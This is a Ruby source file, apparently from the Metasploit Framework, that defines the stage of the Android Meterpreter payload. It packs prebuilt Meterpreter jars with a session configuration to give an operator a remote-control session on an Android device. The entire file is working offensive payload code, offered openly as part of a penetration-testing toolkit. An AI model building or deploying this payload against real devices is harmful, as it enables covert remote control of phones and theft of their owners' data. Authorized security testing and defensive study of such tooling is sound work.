##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/dalvik'
require 'msf/base/sessions/meterpreter_android'
require 'msf/base/sessions/meterpreter_options'
require 'rex/payloads/meterpreter/config'

module MetasploitModule

  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Android Meterpreter',
      'Description' => 'Run a meterpreter server on Android',
      'Author'      => ['mihi', 'egypt', 'anwarelmakrahy', 'OJ Reeves'],
      'Platform'    => 'android',
      'Arch'        => ARCH_DALVIK,
      'License'     => MSF_LICENSE,
      'Session'     => Msf::Sessions::Meterpreter_Java_Android
    ))

    register_options([
      OptBool.new('AutoLoadAndroid', [true, "Automatically load the Android extension", true])
    ], self.class)
  end

  #
  # Override the Payload::Dalvik version so we can load a prebuilt jar to be
  # used as the final stage
  #
  def generate_stage(opts={})
    clazz = 'androidpayload.stage.Meterpreter'
    metstage = MetasploitPayloads.read("android", "metstage.jar")
    met = MetasploitPayloads.read("android", "meterpreter.jar")

    # Name of the class to load from the stage, the actual jar to load
    # it from, and then finally the meterpreter stage
    blocks = [
      java_string(clazz),
      java_string(metstage),
      java_string(met),
      java_string(generate_config(opts))
    ]

    (blocks + [blocks.length]).pack('A*' * blocks.length + 'N')
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      ascii_str:  true,
      arch:       opts[:uuid].arch,
      expiration: datastore['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: [transport_config(opts)]
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the XML version of it
    config.to_b
  end
end
